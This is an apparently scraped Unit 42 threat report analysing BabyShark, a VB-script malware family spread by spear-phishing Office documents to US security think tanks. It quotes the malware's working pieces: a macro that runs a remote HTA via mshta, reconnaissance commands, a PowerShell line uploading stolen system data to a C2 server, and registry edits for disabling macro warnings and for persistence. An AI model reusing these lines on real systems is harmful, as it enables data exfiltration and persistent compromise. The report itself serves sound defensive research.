{
    "title": "new babyshark malware targets u.s. national security think tanks",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nNew BabyShark Malware Targets U.S. National\nSecurity Think Tanks\n40,294\npeople reacted\n4\n5 min. read\nThis post is also available in: 日本語  (Japanese )\nIn February 2019, Palo Alto Networks Unit 42 researchers identified spear phishing emails sent in November\n2018 containing new malware that shares infrastructure with playbooks associated with North Korean\ncampaigns. The spear phishing emails were written to appear as though they were sent from a nuclear security\nexpert who currently works as a consultant for in the U.S. The emails were sent using a public email address with\nthe expert’s name and had a subject referencing North Korea’s nuclear issues. The emails had a malicious Excel\nmacro document attached, which when executed led to a new Microsoft Visual Basic (VB) script‐based malware\nfamily which we are dubbing “BabyShark”.\nBabyShark is a relatively new malware. The earliest sample we found from open source repositories and our\ninternal data sets was seen in November 2018. The malware is launched by executing the first stage HTA  from a\nremote location, thus it can be delivered via different file types including PE files as well as malicious documents.\nIt exfiltrates system information to C2 server, maintains persistence on the system, and waits for further\ninstruction from the operator. Figure 1, below, shows the flow of execution.\nFigure 1 BabyShark execution flow\nUnit 42 was able to determine the phishing emails targeted at least:\nA university in the U.S. which was to hold a conference about North Korea denuclearization issue at the time\nA research institute based in the U.S. which serves as a think tank for national security issues, and where the\npreviously referenced nuclear expert currently works.\nExpanding our search to public repository samples, we identified additional malicious document samples\ndelivering BabyShark. The original file names and decoy contents of these samples suggested that the threat\nactor might have interests in gathering intelligence related to not only North Korea, but possibly wider in the\nNortheast Asia region.\nDuring the investigation, we were able to find links to other suspected North Korean activities in the past;\nKimJongRAT  and STOLEN PENCIL .\nMalicious Documents\nBabyShark is a relatively new malware. The first sample we observed is from November 2018. The decoy\ncontents of all malicious documents delivering BabyShark were written in English and were related to Northeast\nAsia’s regional security issues.\nFigure 2 Timeline of BabyShark malicious documents and filename / decoys\nWhile some decoys used content which is publicly available information on the internet, some used content\nwhich appears to not be public. Inspecting the metadata of the documents with this non‐public content, we\nsuspect that the threat actor likely compromised someone with access to private documents at a U.S. national\nsecurity think tank.\nFigure 3 Decoy content copied from the internet\nFigure 4 Decoy content not publicly available on the internet (intentionally obfuscated)\nThe malicious documents contain a simple macro which would load the BabyShark’s first stage HTA at a remote\nlocation.\nSub AutoOpen()\nShell (“mshta https://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta”)\nEnd Sub\nBabyShark Malware Analysis\nAnalyzed sample details:\nSHA256 9d842c9c269345cd3b2a9ce7d338a03ffbf3765661f1ee6d5e178f40d409c3f8\nCreate Date 2018:12:31 02:40:00Z\nModify Date 2019:01:10 06:54:00Z\nFilename Oct_Bld_full_view.docm\nTable 1 Analyzed sample details\nThe sample is a Word document which contains a malicious macro loading BabyShark by executing the first stage\nHTA file at a remote location below:\nhttps://tdalpacafarm[.]com/files/kr/contents/Vkggy0.hta\nAfter successfully loading the first stage HTA, it sends out an HTTP GET request to another location on the same\nC2 server, then decodes the response content with the following decoder function.\nFunction Co00(c)\nL=Len(c)\ns=””\nFor jx=0 To d-1\nFor ix=0 To Int(L/d)-1\ns=s&Mid(c,ix*d+jx+1,1)\nNext\nNext\ns=s&Right(c,L-Int(L/d)*d)\nCo00=s\nEnd Function\nThe decoded BabyShark VB script first enables all future macros for Microsoft Word and Excel by adding the\nfollowing registry keys:\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings, value:1\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings, value:1\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings, value:1\nHKCU\\Software\\Microsoft\\Office\\14.0\\WORD\\Security\\VBAWarnings, value:1\nHKCU\\Software\\Microsoft\\Office\\15.0\\WORD\\Security\\VBAWarnings, value:1\nHKCU\\Software\\Microsoft\\Office\\16.0\\WORD\\Security\\VBAWarnings, value:1\nIt then issues a sequence of Windows commands and saves the results in %AppData%\\Microsoft\\ttmp.log.\nwhoami\nhostname\nipconfig /all\nnet user\ndir “%programfiles%”\ndir “%programfiles% (x86)”\ndir “%programdata%\\Microsoft\\Windows\\Start Menu”\ndir “%programdata%\\Microsoft\\Windows\\Start Menu\\Programs”\ndir “%appdata%\\Microsoft\\Windows\\Recent”\ntasklist\nver\nset\nreg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default”\nThe collected data is encoded using Windows certutil.exe tool, then uploaded to the C2 via a HTTP POST\nrequest.\nretu=wShell.run(“certutil -f -encode “””&ttmp&””” “””&ttmp1&””””,0,true)\nretu=wShell.run(“powershell.exe (New-Object\nSystem.Net.WebClient).UploadFile(‘https://tdalpacafarm[.]com/files/kr/contents/up\nload.php’,'”&ttmp1&”‘);del “””&ttmp1&”””;del “””&ttmp&””””,0,true)\nBabyShark adds the following registry key value to maintain persistence and waits for further commands from the\noperator. Unfortunately, we were not able to collect additional commands issued by the operator.\nHKCU\\Software\\Microsoft\\Command Processor\\AutoRun, value: “powershell.exe mshta\nhttps://tdalpacafarm[.]com/files/kr/contents/Usoro.hta”\nThis registry key executes the string value when cmd.exe is launched. BabyShark ensures cmd.exe is launched by\nregistering the following scripts as scheduled tasks:\n[%AppData%\\Microsoft\\Axz\\zvftz.vbs]\nSet wShell=CreateObject(“WScript.Shell”):retu=wShell.run(“cmd.exe /c taskkill /im\ncmd.exe”,0,true)\n[%AppData%\\Adobe\\Gqe\\urjlt.js]\nwShell=new ActiveXObject(“WScript.Shell”);retu=wShell.run(“cmd.exe /c taskkill\n/im cmd.exe””,0,true);\nLinks to Other Activity\nWe noticed BabyShark having connections with other suspected North Korean activities in the past; KimJongRAT\nand STOLEN PENCIL.\nKimJongRAT connection:\nBabyShark and KimJongRAT use the same file path for storing collected system information:\n%AppData%/Microsoft/ttmp.log.\nKimJongRAT had similar interests in targeting national security related targets. The malware was delivered with\nthe following decoys:\nDecoy Filename Dropper SHA256\nKendall‐AFA 2014 Conference‐\n17Sept14.pdfc4547c917d8a9e027191d99239843d511328f9ec6278009d83b3b2b8349011a0\nU.S. Nuclear Deterrence.pdf 1ad53f5ff0a782fec3bce952035bc856dd940899662f9326e01cb24af4de413d\n제30차한미안보  안내장\nENKO.fdp.etadpU.scr (translates to 30\nKorea‐U.S. National Security Invitation\nUpdate)b3e85c569e89b6d409841463acb311839356c950d9eb64b9687ddc6a71d1b01b\nConference Information_2010 IFANS\nConference on Global Affairs (1001).pdf0c8f17b2130addebcb2ca75bd7a982e37ddcc49d49e79fe60e3fda767f2ec972\nTable 2 Decoy filename used when delivering KimJongRAT\nThe threat actor behind the BabyShark malware frequently tested its samples for anti‐virus detection when\ndeveloping the malware. The testing samples included a freshly compiled KimJongRAT.\nSHA256 SizeCompile\nDateAV Test\nSite\nUpload\nDate\n52b898adaaf2da71c5ad6b3dfd3ecf64623bedf505eae51f9769918dbfb6b731685,56\n8 bytes2019‐01‐\n04\n05:44:312019‐\n01‐04\n08:15:4\n1\nTable 3 Freshly compiled testing KimJongRAT sample\nSTOLEN PENCIL connection:\nA freshly compiled testing version of a PE type BabyShark loader was uploaded to a public sample repository.\nThe sample was signed with the stolen codesigning certificate used in the STOLEN PENCIL campaign. We did not\nnotice any other malware being signed with this certificate.\nSHA256 Size Compile DateAV Test Site Upload\nDate\n6f76a8e16908ba2d576cf0e8cdb70114dcb70e0f7223be\n10aab3a728dc65c41c32,912 bytes 2018‐12‐21 00:34:35 2018‐12‐21 08:30:28\nTable 4 Signed testing version of PE type BabyShark loader sample\nFigure 5 Codesign details\nConclusion\nBabyShark is being used in a limited spear phishing campaign which started in November 2018 and is still\nongoing. The threat actor behind it has a clear focus on gathering intelligence related to Northeast Asia’s national\nsecurity issues. Well‐crafted spear phishing emails and decoys suggest that the threat actor is well aware of the\ntargets, and also closely monitors related community events to gather the latest intelligence. While not\nconclusive, we suspect that the threat actor behind BabyShark is likely connected to the same actor who used\nthe KimJongRAT malware family, and at least shares resources with the threat actor responsible for the STOLEN\nPENCIL campaign. We also noticed testing indicating the attackers are working on a PE loader for BabyShark. The\nthreat actor may use different methods to deliver BabyShark in the future campaigns.\nPalo Alto Networks customers are protected from this threat in the following ways:\nWildFire and Traps detect all the malware supported in this report as malicious.\nC2 domains used by the attackers are blocked via Threat Prevention.\nAutoFocus customers can monitor ongoing activity from the threats discussed in this report by looking at the\nfollowing tag:\nBabyShark\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow\nCyber Threat Alliance members. CTA members use this intelligence to rapidly deploy protections to their customers and to\nsystematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit cyberthreatalliance.org.\nIndicators of Compromise\nMalicious Documents:\n7b77112ac7cbb7193bcd891ce48ab2acff35e4f8d523980dff834cb42eaffafa\n9d842c9c269345cd3b2a9ce7d338a03ffbf3765661f1ee6d5e178f40d409c3f8\n2b6dc1a826a4d5d5de5a30b458e6ed995a4cfb9cad8114d1197541a86905d60e\n66439f0e377bbe8cda3e516e801a86c64688e7c3dde0287b1bfb298a5bdbc2a2\n8ef4bc09a9534910617834457114b9217cac9cb33ae22b37889040cde4cabea6\n331d17dbe4ee61d8f2c91d7e4af17fb38102003663872223efaa4a15099554d7\n1334c087390fb946c894c1863dfc9f0a659f594a3d6307fb48f24c30a23e0fc0\ndc425e93e83fe02da9c76b56f6fd286eace282eaad6d8d497e17b3ec4059020a\n94a09aff59c0c27d1049509032d5ba05e9285fd522eb20b033b8188e0fee4ff0\nPE version loader, signed with stolen certificate:\n6f76a8e16908ba2d576cf0e8cdb70114dcb70e0f7223be10aab3a728dc65c41c\nGet updates from Palo Alto  Networks!\nSign up to receive the latest news, cyber threat intelligence and research from us\nBy Unit 42\nFebruary 22, 2019 at 6:00 AM\nCategory: Unit 42\nTags: Babyshark , KimJongRAT , STOLEN PENCIL\nth\nEmail address\nSubscribe\nI'm not a robot\nreCAPTCHA\nPrivacy  - Terms\nBy submitting this form, you agree to our Terms of Use  and acknowledge\nour Privacy Statement .\n© 2020 Palo Alto Networks, Inc. All rights reserved.\nPopular Resources\nResource Center\nBlog\nCommunities\nTech Docs\nUnit 42\nSitemap\nLegal No ces\nPrivacy\nTerms of Use\nDocuments\nAccount\nManage Subscriptions\nReport a Vulnerability\nSearch Unit 42\nSHARE \n "
}